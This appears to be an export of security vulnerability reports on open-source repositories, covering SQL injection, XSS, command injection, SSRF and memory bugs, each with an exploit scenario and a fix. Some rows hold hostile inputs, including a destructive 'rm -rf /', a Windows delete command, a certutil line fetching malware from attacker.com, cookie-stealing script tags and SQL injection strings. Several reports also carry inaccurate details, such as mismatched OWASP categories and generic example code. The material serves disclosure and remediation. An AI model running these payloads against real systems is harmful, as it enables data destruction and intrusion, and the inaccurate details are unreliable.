+    if (!isSafeUrl(`${backend}/verify-domain`)) {
+        return Response.json({ success: false, error: ""Unsafe backend URL"" }, { status: 400 });
+    }

     if (request.nextUrl.pathname === ""/healthy"") {
         return Response.json({ success: true });
     }

     try {
         const response = await fetch(`${backend}/verify-domain`);

         if (!response.ok) {
             throw new Error();
         }

         const resp = await response.json();

         requestHeaders.set(""domain"", resp.domain);

         if (request.nextUrl.pathname === ""/favicon.ico"") {
             try {
-                if (resp.logo) {
-                    const response = await fetch(resp.logo);
-                    if (response.ok) {
-                        const blob = await response.blob();
-                        return new NextResponse(blob, {
-                            headers: {
-                                ""content-type"": ""image/webp"",
-                            },
-                        });
-                    } else {
-                        return NextResponse.rewrite(
-                            new URL(`/default-favicon.ico`, request.url),
-                        );
-                    }
-                } else {
-                    return NextResponse.rewrite(
-                        new URL(`/default-favicon.ico`, request.url),
-                    );
-                }
+                if (resp.logo && isSafeUrl(resp.logo)) {
+                    const logoResp = await fetch(resp.logo);
+                    if (logoResp.ok) {
+                        const blob = await logoResp.blob();
+                        return new NextResponse(blob, {
+                            headers: {
+                                ""content-type"": ""image/webp"",
+                            },
+                        });
+                    }
+                }
+                return NextResponse.rewrite(
+                    new URL(`/default-favicon.ico`, request.url),
+                );
             } catch (err) {
                 return NextResponse.rewrite(
                     new URL(`/default-favicon.ico`, request.url),
                 );
             }
         }

         return NextResponse.next({
             request: {
                 headers: requestHeaders,
             },
         });
     } catch (err) {
         return Response.json(
             { success: false, error: err.message },
             { status: 404 },
         );
     }
 });

 export const config = {
     matcher: [""/"", ""/favicon.ico"", ""/api/:path*"", ""/healthy""],
     unstable_allowDynamic: [""/node_modules/next-auth/**""],
 };

"
21,1745482942102,GNOME/libxml2,CWE-476,High,2025-04-27T15:40:33.000Z,2025-04-28T05:57:13.000Z,"The vulnerability is located in the function `xmlXPathNodeEval()` inside the `xpath.c` file in the libxml2 repository.

Specifically:
- The function calls `xmlXPathNewContext(doc)` without checking if the returned pointer (`ctxt`) is NULL.
- Immediately after allocation, `ctxt->node = node;` is executed without a NULL check, causing a potential NULL dereference if allocation failed.

To find the vulnerable code:
1. Open `xpath.c`.
2. Locate the function `xmlXPathNodeEval()`.
3. Observe the lack of a NULL check after `xmlXPathNewContext(doc)`.

Suggested Fix:
- Insert a check: `if (ctxt == NULL) return NULL;` immediately after the call to `xmlXPathNewContext(doc)` before accessing `ctxt->node`.

This issue can be triggered when parsing malformed XML or under low-memory conditions, potentially leading to a crash (denial-of-service).

Vulnerability Type: CWE-476: NULL Pointer Dereference

Proof of Concept:
In the function vulnerable_xpath_eval, if xmlXPathNewContext(doc) returns NULL due to a malformed document or low memory condition, the program dereferences ctxt without checking, leading to a NULL pointer dereference crash.

OWASP Top 10 category:
A5:2017 – Broken Access Control (leading to Denial of Service)

Severity:
4 - High

Root Cause:
The application fails to validate the result of xmlXPathNewContext() before dereferencing it, assuming allocation and context creation always succeed.

Exploit Scenario:
An attacker supplies a crafted or malformed XML file that causes xmlXPathNewContext() to fail, resulting in a crash when the application attempts to access ctxt->node.

Why It Happens:
Missing NULL checks after critical allocation functions, trusting external input without verification.

Security Implications:
Remote attackers could cause denial-of-service by forcing crashes in XML parsing systems that rely on libxml2.

Suggested Fix:
Check if xmlXPathNewContext() returns NULL before accessing the context object. Safely handle allocation failures.

Security Hardening Suggestion:
In addition to fixing the immediate NULL dereference in `xmlXPathNodeEval()`, I recommend introducing a standardized macro or wrapper function inside libxml2 for all future memory allocations or context creations.

Example:
#define SAFE_ALLOC_CHECK(ptr) if ((ptr) == NULL) return NULL;

This would enforce a consistent, project-wide policy where every allocation or new object creation must be immediately checked, reducing the likelihood of future NULL dereference vulnerabilities.

Standardizing defensive programming practices like this could improve libxml2’s overall resilience against memory exhaustion and malformed input scenarios across its parsing modules (parser.c, tree.c, xpath.c, etc.).
"
22,1745484181760,https://github.com/spree/spree/blob/main/admin/app/views/spree/admin/orders/_table_filter_dropdown.html.erb,CWE-79,High,2025-04-24T08:43:01.000Z,2025-04-26T12:26:58.000Z,"[Refer ZIP File For Detailed Report]
Vulnerability Type: 
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Proof of Concept:
params.to_unsafe_h.deep_merge({q: {shipment_state_eq: :shipped, shipment_state_not_in: '', state_eq: '', state_in: '', refunded: '', partially_refunded: ''}})
This line directly incorporates user-controlled parameters (params.to_unsafe_h) into HTML without sanitization or escaping. If an attacker includes malicious JavaScript in a parameter, such as:
?q[shipment_state_eq]=<script>alert(1)</script>
and the view renders this input, the script could execute in the victim's browser.
Solution:
Use strong parameter filtering and avoid rendering raw parameter values directly in views. Escape all user inputs using h() or ensure Rails' default output escaping is preserved.

Severity:
High — Since XSS can lead to session hijacking, CSRF, and data theft.

Root Cause:
The code merges unfiltered, potentially unsafe user parameters (params.to_unsafe_h) directly into a hash used for rendering UI elements, without sanitization or encoding.

Exploit Scenario:
An attacker sends a specially crafted URL to a user with a malicious parameter like:
?q[shipment_state_eq]=<script>stealCookies()</script>
If the page renders this value back to the browser, the script executes in the context of the application.

Why It Happens:
Rails’ to_unsafe_h bypasses strong parameter filtering, and when merged into hashes used for rendering, malicious data can be embedded directly in the HTML output without proper encoding.

Security Implications:
An attacker can execute JavaScript in the context of an authenticated user, leading to theft of session tokens, user impersonation, or redirection to malicious websites.

Suggested Fix:
Avoid using to_unsafe_h unless necessary. Prefer params.permit(...) to whitelist only safe keys and values. Always ensure values rendered in views are HTML-escaped or sanitized.
params.permit(q: [:shipment_state_eq, :shipment_state_not_in, :state_eq, :state_in, :refunded, :partially_refunded]).to_h.deep_merge(...)

"
23,1745501121281,emscripten-core/emscripten,CWE-787,Low,2025-04-27T12:45:30.000Z,2025-04-27T12:46:55.000Z,"Vulnerability Type: CWE-787: Out-of-bounds Write

Severity: Low (2)

OWASP Category: A05:2021 – Security Misconfiguration

Root Cause: When compiling libde265 with Emscripten without sanitization, WebAssembly code can perform unchecked memory accesses. In this simulation, a JavaScript buffer is passed to a C++ function that writes beyond the fixed-size buffer's bounds.

Exploit Scenario: JavaScript sends a 64-byte input to a function that writes to a 16-byte C++ buffer without checking boundaries. This leads to memory corruption.

Why It Happens: The function does not validate the input length before copying data into the fixed buffer. Without sanitization, such bugs are not caught.

Security Implications: May result in memory corruption or instability when processing malformed or large inputs.

Suggested Fix: Introduce explicit bounds checks in C++ code. Also, compile with -fsanitize=address to catch similar issues during development."
24,1745504421855,https://github.com/binjolaaman10/python-file-manager/tree/master,"CWE-77, CWE-78",Critical,2025-04-24T14:20:21.000Z,2025-04-25T08:28:24.000Z,"Vulnerability Type: CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

Proof of Concept: File opening logic at line 81 of ""File Manager.py"" - (os.system('""' + res + '""'))
Severity: 5 (Criticial)

Root Cause: Directly passing user-controlled filenames to os.system() allows execution of malicious commands if filenames contain special characters.

Exploit Scenario: If an attacker inputs ""; rm -rf /"" in the filename/folder, then the unsanitised input will trigger the deletion of the entire filesystem. Similarly, an input ""& certutil -urlcache -split -f http://attacker.com/malware.exe"" would fetch and execute remote malware in the windows system.

Why it Happens: No validation of special characters in filenames/directory names, the input is directly passed to the os.system() function.

Security Implications: Presence of arbitrary command execution leads to full system compromise. Attacker will gain access to the entire system and execute malicious commands and access sensitive files.

Suggested Fix: Use subprocess.run() with proper character escaping and use shell=False (default) to prevent command interpretation
import subprocess
subprocess.run(['open', filename], shell=false)"
25,1745509252502,https://github.com/yrncollo/cpp-projects/blob/main/Banking-management-system/src/main.cpp,CWE-190,Medium,2025-04-24T15:40:52.000Z,2025-04-26T11:00:52.000Z,"Root Cause
The vulnerability arises because the code takes user-supplied withdrawal amounts from standard input and feeds them directly into an integer subtraction operation (it.balance - withdrawal_amount) without any validation or overflow checks, allowing the signed integer to wrap around when its result underflows the type’s minimum bound.

Exploit Scenario
An attacker could input an excessively large withdrawal amount—either larger than the current balance or near the negative limit of the int type—causing the subtraction to wrap the signed integer underflow, yielding a large positive balance that bypasses “insufficient funds” checks and enables unauthorized withdrawals.

Why It Happens
Because the implementation uses plain signed int for balance and omits any pre-operation bounds validation, the subtraction operation does not guard against underflow; when the result is less than INT_MIN, it wraps around per two’s-complement arithmetic, producing an incorrect positive or negative value.
Security Implications
If exploited, this underflow can artificially inflate an account’s balance, allowing attackers to withdraw far more funds than they possess, potentially leading to financial loss, data corruption, denial of service through application crashes, or further privilege escalation within banking operations.

Suggested Fix
Validate withdrawal inputs to ensure they are non-negative and do not exceed the current account balance before performing the subtraction; incorporate explicit underflow checks (e.g., verify withdrawal_amount <= it.balance and that it.balance - withdrawal_amount >= std::numeric_limits<int>::min()), or use safe-integer wrappers or wider types (such as int64_t or arbitrary-precision libraries) that signal an error on overflow, thereby preventing wraparound and enforcing correct business logic."
26,1745515064833,https://github.com/megat69/ACPL/blob/master/console.py,CWE-78,Critical,2025-04-27T14:37:01.000Z,2025-04-27T14:44:00.000Z,"Root Cause:
The code uses os.system to execute system commands, concatenating user input directly without sanitization or validation. This allows arbitrary commands to be executed.
Vulnerable code:
if platform.system() == ""Windows"":
    os.system(""start "" + user_input)
else:
    os.system(""open "" + shlex.quote(user_input))

Exploit Scenario:
An attacker could supply malicious input (e.g., ; rm -rf / --) to execute unintended system commands, potentially deleting files or compromising the system.
Vulnerable code:
if platform.system() == ""Windows"":
    os.system(""start "" + user_input)
else:
    os.system(""open "" + shlex.quote(user_input))

Why It Happens:
The application does not validate or sanitize user-provided inputs before passing them to os.system. This design flaw allows arbitrary command execution.

Security Implications:
Exploitation can lead to full system compromise, including file deletion, data loss, unauthorized access to sensitive files, or installation of malicious programs."
27,1745517207351,https://github.com/Gauravnehra09/Auto-form-filler/blob/main/popup.js,"CWE-922, CWE-311",Medium,2025-04-24T17:53:27.000Z,2025-04-27T12:39:46.000Z,"1.Storing Sensitive User Data in chrome.storage.sync
Issue: No Encryption / Secure Storage
(i) storing user data (first name, last name, email, phone) in chrome.storage.sync, which is not encrypted by default.
(ii)Data in chrome.storage.sync is not encrypted by default
(iii)Can be accessed by other extension components, or read by malicious extensions if not properly scoped

Risk:

If another extension has permission to access chrome.storage.sync, it can read this data.

If your Chrome account is compromised, the data could be synced across devices (risking data exposure).

GDPR/Privacy concerns if you're handling user PII (Personally Identifiable Information).

Fix:

Instead of storing sensitive data in chrome.storage.sync, store secure values in:

chrome.storage.local (less accessible)

Or encrypt before saving (use crypto.subtle API)

Or use chrome.identity API for sensitive info

Exploit:

A malicious extension installed on the same browser could read the user's PII from Chrome’s synced storage

If your extension is compromised or sideloaded, attackers could exfiltrate user data

Impact:

Privacy breach: User’s personal information stolen

Regulatory issues under GDPR/CCPA

Users could be phished or doxxed

Better approach (with encryption):

async function encryptData(data) {
  const encoder = new TextEncoder();
  const encoded = encoder.encode(JSON.stringify(data));
  const key = await crypto.subtle.generateKey(
    { name: ""AES-GCM"", length: 256 },
    true,
    [""encrypt"", ""decrypt""]
  );
  const iv = window.crypto.getRandomValues(new Uint8Array(12)); 
  const encrypted = await crypto.subtle.encrypt({ name: ""AES-GCM"", iv }, key, encoded);
  return { encryptedData: encrypted, iv: iv };
}"
28,1745525332811,NodeBB/NodeBB/blob/master/src/controllers/uploads.js,CWE-434,High,2025-04-24T20:08:52.000Z,2025-04-27T03:16:00.000Z,"Vulnerability Type:  
CWE-434: Unrestricted Upload of File with Dangerous Type

Proof of Concept:

const isImage = uploadedFile.type.match(/image./);
const extension = path.extname(uploadedFile.name).toLowerCase();

if (allowed.length > 0 && (!extension || extension === '.' || !allowed.includes(extension))) {
	throw new Error(`[[error:invalid-file-type, ${allowed.join('&#44; ')}]]`);
}

const isSVG = uploadedFile.type === 'image/svg+xml';
if (isSVG || meta.config.resizeImageWidth === 0 || meta.config.resizeImageWidthThreshold === 0) {
	return fileObj;
}

1.Client sends a file named `payload.svg`, sets `Content-Type: image/svg+xml`.
2. Code uses MIME type and extension to allow file.
3. SVG files are not resized or sanitized and are returned immediately.
4. Uploaded SVG may contain malicious JavaScript (e.g., `<script>alert(1)</script>`).
5. When the SVG is rendered on a page (e.g., profile image), it triggers stored XSS.
6. The bug is easy to exploit by any authenticated user.
7. Allows stored XSS, leading to session hijacking, account takeover, or privilege escalation.
8. Affects all users who load the attacker’s profile/post.

Severity:
4 - High

Root Cause:
The upload handler trusts MIME type and file extension values provided by the client and does not validate the actual file contents via magic byte analysis. It also allows SVG files without proper sanitization, allowing malicious payloads to be uploaded and executed.

Exploit Scenario:
An attacker uploads an `.svg` file containing embedded JavaScript using a spoofed `Content-Type: image/svg+xml`. The application accepts the upload, stores the file, and later renders it on a page, resulting in automatic script execution in other users' browsers.

Why It Happens:
The server performs validation only on file extensions and MIME types provided by the user instead of verifying the file's true type using magic bytes or robust libraries. Additionally, it does not sanitize SVG files or block them entirely despite their inherent risk.

Security Implications:
An attacker can achieve stored XSS, execute scripts in other users’ sessions, steal cookies or JWTs, hijack admin sessions, or launch further attacks from a trusted context. The vulnerability affects all users who interact with uploaded content.

Suggested Fix:
Validate uploaded files using a magic-bytes detection library like `file-type` to ensure actual content matches expected image MIME types. Disallow SVG uploads or sanitize them thoroughly using a secure sanitizer. Reject all files that fail validation."
29,1745551349479,https://github.com/r12w4n/Asset-Tracker/blob/master/connection.php,CWE-89,Critical,2025-04-26T16:57:07.000Z,2025-04-27T06:09:25.000Z,"Vulnerability Type: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection').

Proof of Concept:

app.get('/user', (req, res) => {
  const username = req.query.username;
  db.query(`SELECT * FROM users WHERE username = '${username}'`, (err, result) => {
    if (err) throw err;
    res.send(result);
  });
});
In the above code, user input is concatenated directly into an SQL query. If a user provides input like ' OR '1'='1, it turns the query into:

sql
Copy
Edit
SELECT * FROM users WHERE username = '' OR '1'='1'
This allows attackers to retrieve all records, bypassing the intended logic.

Severity: 5/5 – Critical. This vulnerability may allow full database compromise and unauthorized access.

Root Cause: The code dynamically builds SQL queries using user input without sanitization or parameterization. This allows the input to break query structure and inject malicious SQL, leading to unintended execution.

Exploit Scenario: An attacker crafts a URL like /user?username=' OR '1'='1' which manipulates the SQL query logic to bypass filters, exposing all records or sensitive information.

Why It Happens: This occurs because the application includes raw user input directly into the SQL query string, rather than using safe methods like parameterized queries. This is a fundamental security design flaw.

Security Implications: If exploited, this can lead to complete data leakage, authentication bypass, unauthorized data manipulation, or even full control of the database depending on permissions.

Suggested Fix: Replace string concatenation with parameterized queries. For example:

javascript
Copy
Edit
db.query(""SELECT * FROM users WHERE username = ?"", [username])
Input should also be validated and sanitized, and the database user should have only limited privileges.

Affected Pages -
1)  Asset-Tracker/connection.php
    ❯❱ temp.sqli-taint-user-input
          Possible SQL Injection vulnerability via user input in variable 'email'
}
 
if ($password == $pswrepeat) {
    $password = md5($password);
    $query = ""INSERT INTO user (fname, lname, phone, email, password) VALUES ('$fname','$lname','$phone','$email','$password')"";
    mysqli_query($conn,$query);
    $_SESSION['message'] = ""You Are Now Registered"";
    // $_SESSION['email'] = $email;
    header(""location: login.php"");"
30,1745552124443,NestumMilo-isFezan/hotel-management/blob/main/app/auth/register-action.php,CWE-89,High,2025-04-27T16:07:22.000Z,2025-04-27T18:16:29.000Z,"Vulnerability Type:
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Proof of Concept:
Vulnerable Code Snippet: https://github.com/NestumMilo-isFezan/hotel-management/blob/main/app/auth/register-action.php line 5 to 30

 //STEP 1: Form data handling using mysqli_real_escape_string function to escape special characters for use in an SQL query,
    if ($_SERVER[""REQUEST_METHOD""] == ""POST"") {
        $username = mysqli_real_escape_string($conn, $_POST['username']);
        $email = mysqli_real_escape_string($conn, $_POST['email']);
        $password = mysqli_real_escape_string($conn, $_POST['password']);
        $confirmPwd = mysqli_real_escape_string($conn, $_POST['confirmPwd']);

          //Validate pwd and confrimPwd
        if ($password !== $confirmPwd) {
            echo ""password not match"";
            exit();
        }
    //STEP 2: Check if userEmail already exist
        $sql = ""SELECT * FROM useracc WHERE email='$email' LIMIT 1"";	
        $result = mysqli_query($conn, $sql);
        if (mysqli_num_rows($result) == 1) {
            echo ""email exist"";
            exit();
        }
        else {
            // User does not exist, insert new user record, hash the password		
            $pwdHash = trim(password_hash($_POST['password'], PASSWORD_DEFAULT)); 
            //echo $pwdHash;
            $sql = ""INSERT INTO useracc (username, email, password ) VALUES ('$username','$email', '$pwdHash')"";
            $insertOK=0;
        }

Step-by-Step Explanation:

1) Input is taken directly from the user via the POST request.

2) It is concatenated directly into an SQL query string without validation or sanitization.

3) When a malicious input like ' OR '1'='1 is submitted, it alters the logic of the query.

4) This allows attackers to bypass logic checks or access unauthorized records.

Severity:
High – It allows full bypass of authentication or unauthorized access to sensitive data.

Root Cause:
User input is embedded directly into SQL queries without proper escaping or use of prepared statements, making the database vulnerable to injection attacks.

Exploit Scenario:
An attacker inputs ' OR '1'='1 into a login or data access form field. The query becomes always true, granting access or altering database records without proper authorization.

Why It Happens:
The application dynamically constructs SQL queries with unsanitized user input. Lack of input validation and absence of prepared statements leads to this issue.

Security Implications:
An attacker can bypass login authentication, retrieve all database records, delete or alter data, or even gain admin access, causing severe data breaches or system compromise.

Suggested Fix:
Use parameterized queries (prepared statements) instead of directly inserting user inputs. Also implement input validation, escaping, and web application firewalls to prevent SQL injection.

Affected Pages -
1) Possible SQL Injection vulnerability via user input in variable 'password'"
31,1745554645607,node-ffi-napi/node-ffi-napi,CWE-119,Low,2025-04-25T04:17:25.000Z,2025-04-27T03:20:26.000Z,"Vulnerability Type: CWE-401: Improper Release of Memory Before Removing Last Reference ('Memory Leak')

OWASP Category: A09:2021 – Security Logging and Monitoring Failures

Proof of Concept:
const ffi = require('ffi-napi');
const libc = ffi.Library('libc', { 'atoi': ['int', ['string']] });
for (let i = 0; i < 1e6; i++) libc.atoi('123');
This repeatedly calls a native function, but memory use increases.

Severity: Low (2)

Root Cause: The ffi-napi library does not correctly free internal resources when repeatedly calling native functions in rapid succession. This leads to memory not being released back to the system.

Exploit Scenario: An attacker or developer using ffi-napi to call C functions in a loop (e.g., from user input or automation) could cause memory usage to balloon over time, eventually leading to degraded performance or a crash.

Why It Happens: ffi-napi wraps native function calls in a way that allocates memory behind the scenes, but it does not properly dispose of these allocations after use.

Security Implications: If abused, this vulnerability can lead to a denial-of-service through memory exhaustion, especially in long-running or sensitive processes like servers or CLI tools.

Suggested Fix: Avoid excessive looping of native calls, ensure all returned pointers are cleaned up, and consider using a memory-managed alternative or pooling mechanism to manage native interop more safely."
32,1745558131601,https://github.com/codelitdev/courselit/blob/main/apps/web/pages/api/auth/code/generate.ts,CWE-1287,Low,2025-04-25T05:15:31.000Z,2025-04-26T17:15:58.000Z,"Vulnerability Type:
CWE-20: Improper Input Validation
Proof of Concept:
const sanitizedEmail = (email as string).toLowerCase();
•	The email variable is extracted from req.query.
•	The code forcibly casts email to a string using (email as string) without validating the actual runtime type.
•	If an attacker supplies an array instead of a string (e.g., ?email[]=attacker@example.com), TypeScript’s type assertion won’t prevent it, and the call to .toLowerCase() will result in a TypeError.
Example Attack:
GET /api/verify?email[]=attacker@example.com&email[]=victim@example.com
Results in:
TypeError: [""attacker@example.com"", ""victim@example.com""].toLowerCase is not a function
Severity:
Low – but can have severe consequences, potentially leading to a range of vulnerabilities, including denial of service (DoS), arbitrary code execution, and data breaches
Root Cause:
The vulnerability is caused by the misuse of TypeScript's type assertion, which does not perform actual runtime validation. The code trusts the input type blindly and assumes email is a string without checking, leading to potential runtime exceptions.

Exploit Scenario:
An attacker can exploit this by sending a query with email[] instead of a string. Express will parse it into an array, and when .toLowerCase() is called on that array, the server throws a TypeError. This can cause application crashes or interfere with email validation and login flows.
Request:
http
CopyEdit
GET /api/verify?email[]=a@example.com&email[]=b@example.com
Parsed by Express:
js
CopyEdit
{ email: [""a@example.com"", ""b@example.com""] }
What Happens:
ts
CopyEdit
([""a@example.com"", ""b@example.com""] as string).toLowerCase()
// TypeError: .toLowerCase is not a function
Result: Server crashes or internal error is thrown.

Why It Happens:
This issue arises because of the assumption that query parameters like email are always strings. The developer casts the value without checking if it’s truly a string at runtime. Since query parameters can be arrays (via repeated keys), this creates a type mismatch.

Security Implications:
If exploited, this vulnerability could crash the API handler, cause denial-of-service (DoS), or interfere with the login process. It may also expose other logic flaws depending on how invalid email inputs are handled downstream.

Suggested Fix:
--- a/pages/api/verify/index.ts
+++ b/pages/api/verify/index.ts
@@
-    const { email } = req.query;
-    if (!email) {
-        return;
-    }
-    const code = generateUniquePasscode();
-    const sanitizedEmail = (email as string).toLowerCase();
+    const { email } = req.query;
+    if (typeof email !== ""string"") {
+        return res.status(400).json({ message: ""Invalid email format"" });
+    }
+    const code = generateUniquePasscode();
+    const sanitizedEmail = email.toLowerCase();
"
33,1745564868531,naviserver-project/naviserver,CWE-117,Very Low,2025-04-25T07:07:48.000Z,2025-04-27T12:27:26.000Z,"Vulnerability Type: CWE-117: Improper Output Neutralization for Logs

Proof of Concept: 
In the file `log.c`, the function `ns_log()` logs user input directly using printf-style formatting:
ns_log(Error, ""User input: %s"", user_input);
If user_input contains newline characters (e.g., ""\n""), it will disrupt the formatting of logs and could potentially lead to log injection or misleading log entries.

OWASP Top 10 Category: A09:2021 – Security Logging and Monitoring Failures

Severity: Very Low (Level 1)

Root Cause: User input is inserted into logs without sanitization or escaping. This allows attackers to insert log-breaking characters such as newlines or tabs.

Exploit Scenario: A user submits input containing newline characters like: ""valid\nfalse_entry"". When logged, this creates a misleading second log line that looks like a legitimate event.

Why It Happens: The log function assumes the input is safe for inclusion in logs and does not neutralize newline or carriage return characters.

Security Implications: Attackers can inject misleading or spoofed log entries that can confuse operators or interfere with log-based security monitoring.

Suggested Fix: Sanitize or encode user input before logging. For example, replace newline characters with their escaped representations or remove them entirely."
34,1745565104865,node-ffi-napi/node-ffi-napi,CWE-119,High,2025-04-25T07:11:44.000Z,2025-04-27T12:44:31.000Z,"Vulnerability Type: CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer

Severity: High (4)

OWASP Category: A05:2021 – Security Misconfiguration

Root Cause: A JavaScript string is passed to a native C function using node-ffi-napi. The C function writes this input to a fixed-size buffer without checking its length, which can lead to an out-of-bounds write.

Exploit Scenario: An attacker can send a long string from JavaScript to the native C function. Since the C code does not validate the length, the input overflows the 16-byte buffer, corrupting adjacent memory.

Why It Happens: The C function blindly trusts the length parameter, allowing memory corruption when large input is provided from JavaScript.

Security Implications: Buffer overflow vulnerabilities may lead to program crashes, memory corruption, or arbitrary code execution depending on the context.

Suggested Fix: Always check that the input length does not exceed the size of the destination buffer. This patch ensures the copy does not exceed 15 bytes and guarantees null-termination."
35,1745565199640,emscripten-core/emscripten,CWE-787,High,2025-04-25T07:13:19.000Z,2025-04-27T12:46:10.000Z,"Vulnerability Type: CWE-787: Out-of-bounds Write

OWASP Top 10: This lines up with multiple OWASP Top 10 categories. They are- A04:2021 - Insecure Design, A05:2021 - Security Misconfiguration, and A07:2021 - Identification and Authentication Failures

Severity: High (4)

Root Cause: JavaScript passes input of arbitrary length to a WebAssembly-exposed C++ function that copies data into a fixed-size C++ buffer without validating length.

Exploit Scenario: A malicious user could craft a long input string via JavaScript and pass it to writeToBuffer(), causing it to overwrite memory beyond the 16-byte array boundary in C++.

Why It Happens: The C++ function blindly trusts the len argument, failing to check whether it fits the destination buffer. Since WebAssembly memory is accessible from both C++ and JavaScript, this creates a cross-language memory corruption bug.

Security Implications: Could lead to memory corruption, data leakage, crashes, or even remote code execution in unsafe configurations.

Suggested Fix: Add explicit bounds checking before copying. Limit the length to the buffer’s size."
36,1745565409870,gogs/gogs,CWE-918,High,2025-04-29T11:28:58.000Z,2025-04-29T15:27:47.000Z,"Vulnerability Type: CWE-918: Server-Side Request Forgery (SSRF)

Severity: Critical (5)

OWASP Category: A10:2021 – Server-Side Request Forgery (SSRF)

Root Cause:
The webhook validation logic in Gogs (`internal/route/repo/webhook.go`) only checks the hostname of the webhook target, not its fully resolved IP. This allows attackers to provide DNS names that resolve to internal/private IP addresses.

Exploit Scenario:
An attacker creates a webhook targeting `http://ssrf.attacker.com`. The hostname is allowed by the current code, but `ssrf.attacker.com` resolves to `127.0.0.1`. Gogs then sends a POST request to this internal IP, potentially triggering sensitive internal behavior (e.g., local metadata services, internal APIs, cloud providers, etc.).

Why It Happens:
The current implementation of `validateWebhook()` calls `IsBlockedLocalHostname()` using only the hostname string, not the resolved IP address.

Security Implications:
- Unauthenticated access to internal-only services
- Potential Remote Code Execution (RCE) if internal endpoints are accessible
- Trust boundary violation
- Possible lateral movement or privilege escalation

Suggested Fix:
Update `validateWebhook()` to perform a DNS resolution and reject any IP addresses in private/reserved ranges (e.g., 127.0.0.1, 10.0.0.0/8, 192.168.0.0/16)."
37,1745567027504,https://github.com/kishanrajput23/Jarvis-Desktop-Voice-Assistant/blob/main/Jarvis/jarvis.py,CWE-78,Critical,2025-04-25T07:43:47.000Z,2025-04-26T12:18:53.000Z,"Proof of Concept: os.system(""shutdown /s /f /t 1"")  # Attackers could inject ""; rm -rf /""

elif ""shutdown"" in query:
            speak(""Shutting down the system, goodbye!"")
            os.system(""shutdown /s /f /t 1"")
            break
            
 elif ""restart"" in query:
            speak(""Restarting the system, please wait!"")
            os.system(""shutdown /r /f /t 1"")
            break

Root Cause: 
Unsanitized user input passed directly to os.system()

Exploit Scenario: 
* The assistant executes system commands directly from voice input.
* If an attacker can manipulate the voice input (e.g., via audio injection or malicious speech recognition), they 
   could execute arbitrary commands like:

    shutdown → Could be modified to shutdown & rm -rf / (Linux) or shutdown & del C:\ (Windows).

* A user says, ""Shutdown the system and delete all files.""

* Due to poor input sanitization, the assistant might execute:

   os.system(""shutdown /s /f /t 1 & del C:\* /Q"")  # Deletes all files before shutdown

* Assistant executes malicious command alongside shutdown


Why It Happens: 
No input validation for system commands


Security Implications:
Full system compromise possible

Suggested Fix: 

* subprocess.run(ALLOWED_COMMANDS[cmd], check=True, shell=False)
        return True
    except subprocess.CalledProcessError:
        return False
* import subprocess
    subprocess.run([""shutdown"", ""/s"", ""/f"", ""/t"", ""1""], shell=False)  # Safer
    subprocess.run([""shutdown"", ""/s""], shell=False)  # Use parameterized commands
* Whitelist allowed commands (e.g., only shutdown, restart)."
38,1745571268615,https://github.com/kishanrajput23/Jarvis-Desktop-Voice-Assistant/blob/main/Jarvis/jarvis.py,CWE-22,High,2025-04-25T08:54:28.000Z,2025-04-26T17:16:42.000Z,"Path Traversal/Unrestricted File Access

Proof of Concept:

def play_music(song_name=None) -> None:
    """"""Plays music from the user's Music directory.""""""
    song_dir = os.path.expanduser(""~\\Music"")
    songs = os.listdir(song_dir)

    if song_name:
        songs = [song for song in songs if song_name.lower() in song.lower()]

    if songs:
        song = random.choice(songs)
        os.startfile(os.path.join(song_dir, song))
        speak(f""Playing {song}."")
        print(f""Playing {song}."")
    else:
        speak(""No song found."")
        print(""No song found."")

os.startfile(os.path.join(song_dir, ""../../../etc/passwd""))

os.startfile(os.path.join(song_dir, song))  # Opens music files
img.save(img_path)  # Saves screenshots


Root Cause: No path validation in file operations
            The assistant reads/writes files without path validation.



Exploit Scenario:
* User requests: *""Play music from ../../../Windows/System32""*

* Assistant accesses system files

* A user says, ""Play music from my Documents folder.""

* The assistant might accidentally execute:
   python
   os.startfile(""C:\\Users\\Victim\\Documents\\malicious.exe"")  # Runs malware

* Read sensitive files: ""Open C:\Users\Admin\passwords.txt"" (if voice recognition misinterprets).

* Overwrite system files: ""Save screenshot as C:\Windows\System32\malicious.dll"".


Why It Happens: Trusts user-provided paths blindly

Security Implications: Confidentiality breach, system file tampering

Suggested Fix:

* from pathlib import Path
  safe_path = Path(""~/Music"").expanduser().resolve()
  if not song_path.resolve().is_relative_to(safe_path):
    raise SecurityError(""Invalid path"")


* Restrict file access to a safe directory:
  python
  MUSIC_DIR = ""C:\\Users\\Public\\Music""  # Only allow access here
  if not song_path.startswith(MUSIC_DIR):
    raise ValueError(""Access denied"")

*Use pathlib for secure path handling:
 python
 from pathlib import Path
 safe_path = Path(MUSIC_DIR) / song_name  # Prevents path traversal"
39,1745572320859,https://github.com/learnhouse/learnhouse/blob/dev/apps/api/src/routers/auth.py,CWE-1004,Very Low,2025-04-25T09:12:00.000Z,2025-04-27T04:58:31.000Z,"Vulnerability Type:
CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag

Proof of Concept:
response.set_cookie(
    key=""access_token_cookie"",
    value=access_token,
    httponly=False,  # <-- Vulnerable setting
    domain=get_learnhouse_config().hosting_config.cookie_config.domain,
    expires=int(timedelta(hours=8).total_seconds()),
)
•	This line sets a sensitive cookie (access_token_cookie) containing a JWT access token.
•	The httponly=False flag allows JavaScript on the page to access the token.
•	This exposes the cookie to client-side scripts, making it vulnerable to theft via XSS attacks.

Severity:
Very Low to low– Sensitive tokens can be stolen, leading to full account compromise.

Root Cause:
The httponly attribute is explicitly set to False, which allows the access token stored in the cookie to be read by JavaScript running in the browser. This undermines one of the core protections against cross-site scripting (XSS) attacks.

Exploit Scenario:
An attacker finds a reflected or stored XSS vulnerability in the application or an adjacent domain. They inject JavaScript that reads document.cookie, steals the access_token_cookie, and sends it to a malicious server, gaining unauthorized access to the user account.

Why It Happens:
The cookie containing the JWT access token is not flagged as HttpOnly, which allows any client-side script to read its value. This breaks secure authentication practices by exposing tokens to the client environment.

Security Implications:
If an attacker steals the access token using XSS, they can impersonate the user and access protected resources without needing credentials. This compromises the confidentiality, integrity, and availability of the user's session and sensitive data.

Suggested Fix:
@@ def refresh(response: Response, Authorize: AuthJWT = Depends()):
-    response.set_cookie(
-        key=""access_token_cookie"",
-        value=new_access_token,
-        httponly=False,
-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,
